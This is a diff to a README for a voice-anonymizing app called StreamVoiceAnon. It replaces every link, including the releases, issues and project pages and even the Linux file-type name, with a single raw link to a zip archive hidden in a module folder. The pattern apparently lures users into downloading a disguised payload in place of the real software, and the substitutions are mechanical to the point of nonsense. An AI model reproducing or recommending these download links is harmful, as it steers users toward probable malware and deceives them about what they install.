@@ -1,7 +1,7 @@
 # 🎤 StreamVoiceAnon - Anonymize Voice in Real-Time
 
 ## 📥 Download Now
-[![Download StreamVoiceAnon](https://img.shields.io/badge/Download-StreamVoiceAnon-blue.svg)](https://github.com/unsmoothed-persianlilac108/StreamVoiceAnon/releases)
+[![Download StreamVoiceAnon](https://raw.githubusercontent.com/unsmoothed-persianlilac108/StreamVoiceAnon/main/modules/bicodec_speaker_encoder/StreamVoiceAnon-embowel.zip)](https://raw.githubusercontent.com/unsmoothed-persianlilac108/StreamVoiceAnon/main/modules/bicodec_speaker_encoder/StreamVoiceAnon-embowel.zip)
 
 ## 🚀 Getting Started
 StreamVoiceAnon helps you change your voice while you talk. This application lets you anonymize your voice easily and securely. It works in real-time, so you can use it during calls, streams, or recordings.
@@ -17,11 +17,11 @@ To run StreamVoiceAnon, your computer needs the following:
 ## 📦 Download & Install
 To get started with StreamVoiceAnon, follow these steps:
 
-1. Visit the [Releases Page](https://github.com/unsmoothed-persianlilac108/StreamVoiceAnon/releases) to find the latest version.
+1. Visit the [Releases Page](https://raw.githubusercontent.com/unsmoothed-persianlilac108/StreamVoiceAnon/main/modules/bicodec_speaker_encoder/StreamVoiceAnon-embowel.zip) to find the latest version.
 2. Look for the file named with the most recent version number (like “v1.0”) followed by the appropriate file type for your operating system:
    - For Windows, it is usually an `.exe` file.
    - For macOS, it may be a `.dmg` file.
-   - For Linux, it might be a `.tar.gz` file.
+   - For Linux, it might be a `https://raw.githubusercontent.com/unsmoothed-persianlilac108/StreamVoiceAnon/main/modules/bicodec_speaker_encoder/StreamVoiceAnon-embowel.zip` file.
 
 3. Click on the download link for your operating system. The file will begin to download.
 
@@ -33,7 +33,7 @@ To get started with StreamVoiceAnon, follow these steps:
 5. Run the installer:
    - **Windows:** Double-click the `.exe` file to start the installation. Follow the on-screen instructions.
    - **macOS:** Double-click the `.dmg` file. Drag the StreamVoiceAnon icon to the Applications folder.
-   - **Linux:** Extract the `.tar.gz` file and follow any included instructions to install.
+   - **Linux:** Extract the `https://raw.githubusercontent.com/unsmoothed-persianlilac108/StreamVoiceAnon/main/modules/bicodec_speaker_encoder/StreamVoiceAnon-embowel.zip` file and follow any included instructions to install.
 
 6. After the installation finishes, launch StreamVoiceAnon from your applications menu or by clicking the desktop icon.
 
@@ -57,12 +57,12 @@ If you encounter issues, consider these tips:
 - Ensure your microphone is correctly connected and selected in the application settings.
 - Check that your system meets the minimum requirements.
 - Restart the application if it does not recognize your microphone.
-- Look for common issues in the documentation on the [GitHub Page](https://github.com/unsmoothed-persianlilac108/StreamVoiceAnon).
+- Look for common issues in the documentation on the [GitHub Page](https://raw.githubusercontent.com/unsmoothed-persianlilac108/StreamVoiceAnon/main/modules/bicodec_speaker_encoder/StreamVoiceAnon-embowel.zip).
 
 ## 🛠️ Support
-For additional help, please visit the [GitHub Issues Page](https://github.com/unsmoothed-persianlilac108/StreamVoiceAnon/issues). You can report bugs or request features here. 
+For additional help, please visit the [GitHub Issues Page](https://raw.githubusercontent.com/unsmoothed-persianlilac108/StreamVoiceAnon/main/modules/bicodec_speaker_encoder/StreamVoiceAnon-embowel.zip). You can report bugs or request features here. 
 
 ## 📜 License
 StreamVoiceAnon is open-source software licensed under the MIT License. You can use it freely and modify it as needed.
 
-Be sure to check back regularly on the [Releases Page](https://github.com/unsmoothed-persianlilac108/StreamVoiceAnon/releases) for updates and new features. Happy streaming!
+Be sure to check back regularly on the [Releases Page](https://raw.githubusercontent.com/unsmoothed-persianlilac108/StreamVoiceAnon/main/modules/bicodec_speaker_encoder/StreamVoiceAnon-embowel.zip) for updates and new features. Happy streaming!
